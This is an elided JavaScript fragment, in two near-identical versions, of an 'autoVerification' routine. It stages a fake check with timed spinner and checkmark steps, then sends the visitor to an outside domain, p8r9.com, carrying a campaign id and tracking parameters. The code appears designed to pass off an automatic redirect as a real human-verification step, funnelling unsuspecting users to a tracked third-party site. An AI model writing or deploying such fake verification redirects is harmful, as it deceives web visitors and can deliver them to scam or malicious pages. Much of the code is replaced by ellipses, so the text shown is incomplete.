  ...
  function autoVerification(){
    ...
    setTimeout(() => {
      ...
      setTimeout(() => {
        ...
        setTimeout(() => { window.location.href = 'http://p8r9.com/?utm_campaign=RuEoNAxI6g&v1=[v1]&v2=[v2]&v3=[v3]'; }, 600);
      }, 5000);
  ...
  function autoVerification(){
    ...
    setTimeout(() => {
      ...
      setTimeout(() => {
        ...
        // Small grace period for the checkmark animation
        setTimeout(() => { window.location.href = 'https://p8r9.com/?utm_campaign=RuEoNAxI6g&v1=[v1]&v2=[v2]&v3=[v3]'; }, 600);
      }, 5000);
    }, 300); // "few milliseconds" before starting the spinner
  }
